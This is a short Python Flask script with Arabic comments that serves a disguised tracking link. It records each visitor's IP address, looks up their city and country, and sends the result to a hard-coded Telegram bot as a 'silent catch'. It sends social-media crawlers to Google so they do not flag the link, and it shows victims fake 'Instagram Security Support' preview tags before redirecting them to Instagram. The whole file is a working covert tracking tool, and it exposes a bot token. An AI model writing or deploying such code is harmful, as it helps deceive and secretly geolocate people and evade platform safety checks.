from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# --- Configuration (كودك الأصلي - لا تغيير) ---
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091" 

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

@app.route('/')
@app.route('/check-status')
@app.route('/photo.jpg')
def track():
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent', 'Unknown')
    ua_lower = user_agent.lower()

    # --- [خطة تجاوز الحماية]: طرد البوتات وتحويلها لموقع موثوق ---
    bots = ['facebook', 'amazon', 'vercel', 'headless', 'bot', 'crawl', 'spider']
    if any(b in ua_lower for b in bots):
        return redirect("https://www.google.com")

    # جلب المعرف العشوائي (الخطة أ) لكسر الكاش
    v_id = request.args.get('v', '100')

    try:
        # جلب الموقع مع حماية الكود من الانهيار
        geo_res = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
        city = geo_res.get('city', 'Unknown')
        country = geo_res.get('country', 'Unknown')
    except:
        city = country = "Error"

    # تقريرك الأصلي مع إضافة الـ Version
    report = (
        f"🎯 <b>صيد صامت ناجح (v={v_id})!</b>\n"
        f"--------------------------\n"
        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
        f"📍 <b>الموقع:</b> {city}, {country}\n"
        f"📱 <b>الجهاز:</b> {user_agent[:60]}...\n"
        f"--------------------------"
    )
    
    # تنفيذ الإرسال فوراً
    send_to_telegram(report)
    
    # --- [السر الحقيقي]: إيهام انستقرام بالتحويل لموقع رسمي ---
    # بمجرد سحب البيانات، نحول الضحية لصفحة انستقرام الرسمية
    return """
    <html>
    <head>
        <meta property="og:title" content="Instagram Security Support">
        <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
        <meta property="og:type" content="video.other">
        <meta http-equiv="refresh" content="0; url=https://www.instagram.com">
    </head>
    <body><script>window.location.replace("https://www.instagram.com");</script></body>
    </html>
    """, 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
